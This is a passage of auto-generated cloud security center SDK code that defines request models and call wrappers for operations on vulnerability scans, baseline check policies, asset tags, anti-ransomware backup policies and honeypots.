    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.bindAll)) {
    query['BindAll'] = request.bindAll;
  }
  if (!Util.isUnset(request.bindAppList)) {
    query['BindAppList'] = request.bindAppList;
  }
  if (!Util.isUnset(request.bindAssetType)) {
    query['BindAssetType'] = request.bindAssetType;
  }
  if (!Util.isUnset(request.bindUuidList)) {
    query['BindUuidList'] = request.bindUuidList;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.ntmVersion)) {
    query['NtmVersion'] = request.ntmVersion;
  }
  if (!Util.isUnset(request.preBind)) {
    query['PreBind'] = request.preBind;
  }
  if (!Util.isUnset(request.preBindOrderId)) {
    query['PreBindOrderId'] = request.preBindOrderId;
  }
  if (!Util.isUnset(request.resourceDirectoryUid)) {
    query['ResourceDirectoryUid'] = request.resourceDirectoryUid;
  }
  if (!Util.isUnset(request.unBindAppList)) {
    query['UnBindAppList'] = request.unBindAppList;
  }
  if (!Util.isUnset(request.unBindUuidList)) {
    query['UnBindUuidList'] = request.unBindUuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyServerlessAuthToMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Manage Serverless Asset Authorization
 *
 * @param request ModifyServerlessAuthToMachineRequest
 * @return ModifyServerlessAuthToMachineResponse
 */
async function modifyServerlessAuthToMachine(request: ModifyServerlessAuthToMachineRequest): ModifyServerlessAuthToMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyServerlessAuthToMachineWithOptions(request, runtime);
}

model ModifySoarStrategySubscribeRequest {
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeSoarStrategies](~~DescribeSoarStrategies~~) operation to obtain the ID.

This parameter is required.', example='8000'),
  subscribeStatus?: boolean(name='SubscribeStatus', description='Specifies whether to create the policy template. Valid values:

*   true: creates the policy template
*   false: deletes the policy template

This parameter is required.', example='true'),
}

model ModifySoarStrategySubscribeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='8BF56229-7FF5-51ED-B958-00B8573E77CD'),
}

model ModifySoarStrategySubscribeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifySoarStrategySubscribeResponseBody(name='body'),
}

/**
 * @summary Creates or deletes a policy template on the My Policies tab of the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request ModifySoarStrategySubscribeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifySoarStrategySubscribeResponse
 */
async function modifySoarStrategySubscribeWithOptions(request: ModifySoarStrategySubscribeRequest, runtime: Util.RuntimeOptions): ModifySoarStrategySubscribeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.subscribeStatus)) {
    query['SubscribeStatus'] = request.subscribeStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySoarStrategySubscribe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates or deletes a policy template on the My Policies tab of the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request ModifySoarStrategySubscribeRequest
 * @return ModifySoarStrategySubscribeResponse
 */
async function modifySoarStrategySubscribe(request: ModifySoarStrategySubscribeRequest): ModifySoarStrategySubscribeResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySoarStrategySubscribeWithOptions(request, runtime);
}

model ModifyStartVulScanRequest {
  types?: string(name='Types', description='The types of vulnerabilities that can be detected. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **image**: container image vulnerabilities
*   **sca**: vulnerabilities that are detected based on software component analysis

> If you leave this parameter empty, all types of vulnerabilities can be detected.', example='"cve,sys,cms,app,emg"'),
  uuids?: string(name='Uuids', description='The UUIDs of servers.', example='{"i-sdada-xxxxx","i-ifaedada-sfsasdxxx"}'),
}

model ModifyStartVulScanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='4066CAC3-F83A-4729-9995-A5558A61B546'),
}

model ModifyStartVulScanResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyStartVulScanResponseBody(name='body'),
}

/**
 * @summary Enables the quick scan feature. You can also enable the feature on the Vulnerabilities page of the Security Center console.
 *
 * @param request ModifyStartVulScanRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyStartVulScanResponse
 */
async function modifyStartVulScanWithOptions(request: ModifyStartVulScanRequest, runtime: Util.RuntimeOptions): ModifyStartVulScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStartVulScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables the quick scan feature. You can also enable the feature on the Vulnerabilities page of the Security Center console.
 *
 * @param request ModifyStartVulScanRequest
 * @return ModifyStartVulScanResponse
 */
async function modifyStartVulScan(request: ModifyStartVulScanRequest): ModifyStartVulScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStartVulScanWithOptions(request, runtime);
}

model ModifyStrategyRequest {
  customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **custom**: a custom baseline check policy
*   **common**: a standard baseline check policy

This parameter is required.', example='common'),
  cycleDays?: string(name='CycleDays', description='The new interval of the baseline check. Valid values:

*   **1**: every 2 days
*   **3**: every 4 days
*   **7**: every 8 days
*   **30**: every 31 days

This parameter is required.', example='1'),
  cycleStartTime?: string(name='CycleStartTime', description='The new time range during which the baseline check starts. Valid values:

*   **0**: The baseline check starts within the time range from 00:00 to 06:00.
*   **6**: The baseline check starts within the time range from 06:00 to 12:00.
*   **12**: The baseline check starts within the time range from 12:00 to 18:00.
*   **18**: The baseline check starts within the time range from 18:00 to 24:00.

>  This parameter is deprecated.', example='18'),
  endTime?: string(name='EndTime', description='The time when the baseline check based on the baseline check policy ends. Specify the time in the hh:mm:ss format.

This parameter is required.', example='05:00:00'),
  id?: string(name='Id', description='The ID of the baseline check policy.', example='245'),
  name?: string(name='Name', description='The new name of the baseline check policy.

This parameter is required.', example='testStrategy'),
  riskCustomParams?: string(name='RiskCustomParams', description='The custom configurations of the baseline. The value of this parameter is in the JSON format and contains the following fields:

*   **typeName**: the name of the baseline.

*   **checkDetails**: the details of the baseline. The value is in the JSON format.

    *   **checkId**: the ID of the check item.

    *   **rules**: the rule configurations. The value is in the JSON format.

        *   **ruleId**: the ID of the rule.

        *   **paramList**: the list of parameters in the rule. The value is in the JSON format.

            *   **paramName**: the name of the parameter.
            *   **value**: the value of the parameter.', example='[{"typeName":"hc_centos_6_custom","checkDetails":[{"checkId":4,"rules":[{"ruleId":"pass_min_days_login_defs.must.cus","paramList":[{"paramName":"range_val","value":"7"}]}]}]}]'),
  riskSubTypeName?: string(name='RiskSubTypeName', description='The subtype of the baselines. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the subtypes of baselines.

This parameter is required.', example='hc_exploit_redis'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X'),
  startTime?: string(name='StartTime', description='The time when the baseline check based on the baseline check policy starts. Specify the time in the hh:mm:ss format.

This parameter is required.', example='00:01:00'),
  targetType?: string(name='TargetType', description='The method that is used to apply the baseline check policy. Valid values:

*   **groupId**: asset groups
*   **uuid**: assets

This parameter is required.', example='groupId'),
}

model ModifyStrategyResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8EFA2BD9-00CD-5D69-B6B0-4EE83EAF072E'),
  result?: {
    strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.', example='8164239'),
  }(name='Result', description='The result returned.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyStrategyResponseBody(name='body'),
}

/**
 * @summary Modifies a baseline check policy.
 *
 * @param request ModifyStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyStrategyResponse
 */
async function modifyStrategyWithOptions(request: ModifyStrategyRequest, runtime: Util.RuntimeOptions): ModifyStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.cycleStartTime)) {
    query['CycleStartTime'] = request.cycleStartTime;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.riskCustomParams)) {
    query['RiskCustomParams'] = request.riskCustomParams;
  }
  if (!Util.isUnset(request.riskSubTypeName)) {
    query['RiskSubTypeName'] = request.riskSubTypeName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a baseline check policy.
 *
 * @param request ModifyStrategyRequest
 * @return ModifyStrategyResponse
 */
async function modifyStrategy(request: ModifyStrategyRequest): ModifyStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyWithOptions(request, runtime);
}

model ModifyStrategyTargetRequest {
  config?: string(name='Config', description='The ID of the baseline check policy. The ID is returned after the policy is created. The value of this parameter is in the JSON format and contains the following field:

*   **strategyId**: the ID of the policy

This parameter is required.', example='{"strategyId":8070645}'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  target?: string(name='Target', description='The information about the asset group to which the policy is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **TargetType**: the type of the asset to which the policy is applied. Set the value to **groupId**, which indicates that the policy is applied to an asset group.
*   **BindUuidCount**: the number of servers to which the policy is applied.
*   **Target**: the ID of the asset group.

This parameter is required.', example='[{"Target":"9273980","BindUuidCount":5320,"TargetType":"groupId","Flag":"del"},{"Target":"9677606","TargetType":"groupId","Flag":"del"},{"Target":"10121607","BindUuidCount":7,"TargetType":"groupId","Flag":"add"},{"Target":"10670708","BindUuidCount":2,"TargetType":"groupId","Flag":"del"},{"Target":"11246338","BindUuidCount":6,"TargetType":"groupId","Flag":"del"},{"Target":"11291161","BindUuidCount":13,"TargetType":"groupId","Flag":"del"}]'),
  type?: string(name='Type', description='The type of the configuration. Set the value to **hc_strategy**.

This parameter is required.', example='hc_strategy'),
}

model ModifyStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0E147337-5B0B-5776-B0B6-D569DBA8F60F'),
}

model ModifyStrategyTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyStrategyTargetResponseBody(name='body'),
}

/**
 * @summary Modifies the servers to which a baseline check policy is applied.
 *
 * @param request ModifyStrategyTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyStrategyTargetResponse
 */
async function modifyStrategyTargetWithOptions(request: ModifyStrategyTargetRequest, runtime: Util.RuntimeOptions): ModifyStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the servers to which a baseline check policy is applied.
 *
 * @param request ModifyStrategyTargetRequest
 * @return ModifyStrategyTargetResponse
 */
async function modifyStrategyTarget(request: ModifyStrategyTargetRequest): ModifyStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyTargetWithOptions(request, runtime);
}

model ModifyTagWithUuidRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If you do not specify this parameter, the tags of all asset types are queried. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
  tagId?: string(name='TagId', description='The ID of the tag that you want to manage.

>  You can call the [DescribeGroupedTags](~~DescribeGroupedTags~~) operation to query the IDs of tags.', example='3897941'),
  tagList?: string(name='TagList', description='The names of the tags that you want to manage. Separate multiple tag names with commas (,).

>  You can call the [DescribeGroupedTags](~~DescribeGroupedTags~~) operation to query the names of tags.

This parameter is required.', example='ac,ad'),
  target?: string(name='Target', description='The details of the server for which you want to manage the tag. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID of the server that you want to add or remove.

*   **targetType**: the method by which the server is added. Valid values:

    *   **uuid**: by server
    *   **groupId**: by server group

*   **flag**: the operation that you want to perform on the server. Valid values:

    *   **del**: removes the tag from the server.
    *   **add**: adds the tag to the server.', example='[{"target":"inet-7c676676-06fa-442e-90fb-b802e5d6****","targetType":"uuid","flag":"add"}]'),
  uuidList?: string(name='UuidList', description='The UUIDs of the servers.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='e2737dc3-78f4-4653-a986-dc5fad4b****,c189f0e3-df22-42d5-a73d-02c05667****'),
}

model ModifyTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='70C4B40D-D55E-4B7B-9992-8535E396B2F4'),
}

model ModifyTagWithUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyTagWithUuidResponseBody(name='body'),
}

/**
 * @summary Modifies the names of the tags that are added to assets, or modifies the tags for assets.
 *
 * @param request ModifyTagWithUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyTagWithUuidResponse
 */
async function modifyTagWithUuidWithOptions(request: ModifyTagWithUuidRequest, runtime: Util.RuntimeOptions): ModifyTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.tagId)) {
    query['TagId'] = request.tagId;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the names of the tags that are added to assets, or modifies the tags for assets.
 *
 * @param request ModifyTagWithUuidRequest
 * @return ModifyTagWithUuidResponse
 */
async function modifyTagWithUuid(request: ModifyTagWithUuidRequest): ModifyTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyTagWithUuidWithOptions(request, runtime);
}

model ModifyUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='sa'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Sa@****'),
  fullPlan?: map[string]any(name='FullPlan', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlan?: map[string]any(name='IncPlan', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='databak'),
  policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
  retention?: int32(name='Retention', description='The retention period of the backup snapshot.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='1048576'),
}

model ModifyUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='sa'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Sa@****'),
  fullPlanShrink?: string(name='FullPlan', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlanShrink?: string(name='IncPlan', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='databak'),
  policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
  retention?: int32(name='Retention', description='The retention period of the backup snapshot.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='1048576'),
}

model ModifyUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F6FAB39-5AF7-5B2C-A17D-16D52AE0****'),
}

model ModifyUniBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyUniBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Modifies an anti-ransomware policy for databases.
 *
 * @param tmpReq ModifyUniBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyUniBackupPolicyResponse
 */
async function modifyUniBackupPolicyWithOptions(tmpReq: ModifyUniBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.policyStatus)) {
    query['PolicyStatus'] = request.policyStatus;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies an anti-ransomware policy for databases.
 *
 * @param request ModifyUniBackupPolicyRequest
 * @return ModifyUniBackupPolicyResponse
 */
async function modifyUniBackupPolicy(request: ModifyUniBackupPolicyRequest): ModifyUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyUniBackupPolicyWithOptions(request, runtime);
}

model ModifyVpcHoneyPotRequest {
  honeyPotAction?: string(name='HoneyPotAction', description='Specifies whether to enable or disable the honeypot. Valid values:

*   **disable**
*   **enable**

This parameter is required.', example='disable'),
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

>  You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.

This parameter is required.', example='vpc-d7o009q63fqy21r8u****'),
}

model ModifyVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8158FE9E-19BE-42D6-9F7A-9BE34A2DE1D5'),
}

model ModifyVpcHoneyPotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyVpcHoneyPotResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI ModifyVpcHoneyPot is deprecated
 *
 * @summary Enables or disables a honeypot.
 *
 * @param request ModifyVpcHoneyPotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyVpcHoneyPotResponse
 */
// Deprecated
async function modifyVpcHoneyPotWithOptions(request: ModifyVpcHoneyPotRequest, runtime: Util.RuntimeOptions): ModifyVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeyPotAction)) {
    query['HoneyPotAction'] = request.honeyPotAction;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI ModifyVpcHoneyPot is deprecated
 *
 * @summary Enables or disables a honeypot.
 *
 * @param request ModifyVpcHoneyPotRequest
 * @return ModifyVpcHoneyPotResponse
 */
// Deprecated
async function modifyVpcHoneyPot(request: ModifyVpcHoneyPotRequest): ModifyVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVpcHoneyPotWithOptions(request, runtime);
}

model ModifyVulConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable the vulnerability scan feature. Valid values:

*   **on**: enables the feature
*   **off**: disables the feature

> Valid values when you set the Type parameter to scanMode:

*   **real**: displays only easily exploitable vulnerabilities.

*   **all**: displays all vulnerabilities.', example='on'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **yum**: YUM and APT source configuration
*   **scanMode**: easily exploitable vulnerability', example='cve'),
}

model ModifyVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24DDBE06-58FF-5E5E-9241-D2010D7913C1'),
}

model ModifyVulConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyVulConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of the vulnerability scan feature.
 *
 * @param request ModifyVulConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyVulConfigResponse
 */
async function modifyVulConfigWithOptions(request: ModifyVulConfigRequest, runtime: Util.RuntimeOptions): ModifyVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of the vulnerability scan feature.
 *
 * @param request ModifyVulConfigRequest
 * @return ModifyVulConfigResponse
 */
async function modifyVulConfig(request: ModifyVulConfigRequest): ModifyVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulConfigWithOptions(request, runtime);
}

model ModifyVulTargetRequest {
  config?: string(name='Config', description='The configurations. The value of this parameter is in the JSON format and contains the following fields:

*   **vulType**: the type of the vulnerabilities to scan. Valid values:

    *   **cve**: Linux software vulnerabilities
    *   **sys**: Windows system vulnerabilities
    *   **cms**: Web-CMS vulnerabilities
    *   **emg**: urgent vulnerabilities', example='{\\\\"vulType\\\\":\\\\"sys\\\\"}'),
  target?: string(name='Target', description='The operation. The value of this parameter is in the JSON format and contains the following fields:

*   **target**: the UUID of the server.

*   **targetType**: the application scope of the operation. Set the value to uuid.

*   **flag**: the type of the operation. Valid values:

    *   **add**: select
    *   **del**: deselect', example='[{\\\\"target\\\\": \\\\"9cd5c684-7201-4de5-ad2c-cea89a5e****\\\\", \\\\"targetType\\\\": \\\\"uuid\\\\", \\\\"flag\\\\": \\\\"add\\\\"}]'),
}

model ModifyVulTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='38597320-A990-5444-9A4C-7A1269610C2A'),
}

model ModifyVulTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyVulTargetResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of the vulnerability scan feature for a server.
 *
